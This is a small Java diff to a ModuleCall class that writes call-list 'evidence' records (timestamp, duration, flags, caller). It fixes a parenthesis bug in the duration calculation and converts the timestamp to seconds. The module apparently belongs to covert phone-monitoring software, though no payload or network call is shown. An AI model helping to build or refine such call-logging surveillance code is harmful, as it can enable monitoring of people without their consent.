@@ -349,14 +349,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		// Adding header
 		try {
 
-			int duration = (int) ((end.getTime() - begin.getTime() / 1000));
+			int duration = (int) ((end.getTime() - begin.getTime()) / 1000);
 			int flags = incoming ? 1 : 0;
 			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveCalllistEvidence) %s -> %s = %s", begin, end, duration);
 			}
 
-			outputStream.write(ByteArray.intToByteArray((int) begin.getTime()));
+			outputStream.write(ByteArray.intToByteArray((int) (begin.getTime() / 1000)));
 			outputStream.write(ByteArray.intToByteArray(programId));
 			outputStream.write(ByteArray.intToByteArray(flags));
 			outputStream.write(WChar.getBytes(from, true));
